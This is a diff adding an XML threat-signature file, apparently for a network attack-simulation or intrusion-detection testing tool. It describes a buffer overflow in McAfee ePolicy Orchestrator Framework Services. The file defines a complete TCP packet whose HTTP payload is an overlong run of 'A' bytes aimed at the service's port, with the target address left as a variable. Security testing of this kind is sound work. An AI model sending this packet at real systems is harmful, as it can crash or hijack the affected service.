@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="McAfee ePolicy Orchestrator Framework Services HTTP Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in McAfee Framework Services used in McAfee ePolicy Orchestrator and other products. Specifically, the vulnerability is due to a boundary error when handling of HTTP requests passed to the port 8081/TCP of the product. An unauthenticated remote attacker can exploit this vulnerability by sending a specially crafted request to the target host. A successful exploitation of this vulnerability can allow for code execution with the privileges of the affected service, or cause a denial of service condition. In an attack case where code injection is not successful, the affected service will terminate abnormally. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="McAfee"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="McAfee_ePolicy_Orchestrator"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="McAfee_ePolicy_Orchestrator_4.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="1c445526bbae812dc9d6163af440a711"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634007018249796394"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1265106606" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:07:E9:0A:07:E5" destMac="00:0C:29:9A:BC:4E" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00B8" Identification="6D03" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6B5C" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="53758" destPort="$HTTPdestPort" SeqNumber="0B29FB83" AckNumber="FA2FE296" HeaderLength="08" WindowSize="05B4" Checksum="6D79" UrgentPointer="0000" Options="0101080ACA3B977F00000000" Payload="41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
